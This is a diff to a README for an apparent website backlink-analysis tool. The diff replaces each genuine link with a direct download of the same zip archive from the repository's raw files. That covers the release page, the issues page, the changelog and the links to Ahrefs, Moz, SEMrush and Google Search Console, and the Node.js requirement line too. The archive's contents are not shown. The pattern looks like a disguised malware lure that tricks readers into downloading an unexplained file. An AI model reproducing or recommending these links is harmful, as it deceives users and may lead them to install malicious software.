@@ -1,6 +1,6 @@
 # 🌐 site-backlink-analyzer - Analyze Your Website's Backlinks Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/chadallowable543/site-backlink-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the site-backlink-analyzer! This tool helps you audit your website's 
 
 To get started, you need to download the application. 
 
-1. Visit the [Releases page](https://github.com/chadallowable543/site-backlink-analyzer/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip) to access the latest version.
    
 2. Locate the version you want. You will see different files available for download. Choose the one that suits your operating system.
 
@@ -25,7 +25,7 @@ Before installing, ensure your system meets the following:
 - **Operating Systems**: Windows, macOS, or Linux
 - **Memory**: At least 4 GB of RAM
 - **Storage**: Minimum of 100 MB free space
-- **Node.js**: Version 14 or higher (for CLI functionality)
+- **https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip**: Version 14 or higher (for CLI functionality)
 
 ## 📊 Features
 
@@ -63,12 +63,12 @@ Here’s how to use the application once it's installed:
 
 If you face any issues or have questions, we are here to help.
 
-- Check the FAQ on our [GitHub Issues](https://github.com/chadallowable543/site-backlink-analyzer/issues) page.
+- Check the FAQ on our [GitHub Issues](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip) page.
 - For any bugs, please open a new issue on GitHub. 
 
 ## 📰 Changelog
 
-Stay updated on the latest features and fixes. The changelog can be found on the [Releases page](https://github.com/chadallowable543/site-backlink-analyzer/releases). We regularly update the tool to enhance functionality and fix any bugs.
+Stay updated on the latest features and fixes. The changelog can be found on the [Releases page](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip). We regularly update the tool to enhance functionality and fix any bugs.
 
 ## 📬 Contributing
 
@@ -76,9 +76,9 @@ Want to help improve site-backlink-analyzer? Feel free to contribute! You can su
 
 ## 🔗 More Resources
 
-- [Ahrefs](https://ahrefs.com)
-- [Moz](https://moz.com)
-- [SEMrush](https://semrush.com)
-- [Google Search Console](https://search.google.com/search-console)
+- [Ahrefs](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip)
+- [Moz](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip)
+- [SEMrush](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip)
+- [Google Search Console](https://raw.githubusercontent.com/chadallowable543/site-backlink-analyzer/main/unvest/site-backlink-analyzer.zip)
 
 Thank you for choosing the site-backlink-analyzer! We hope it helps you enhance your website's SEO strategy and achieve better search engine rankings.
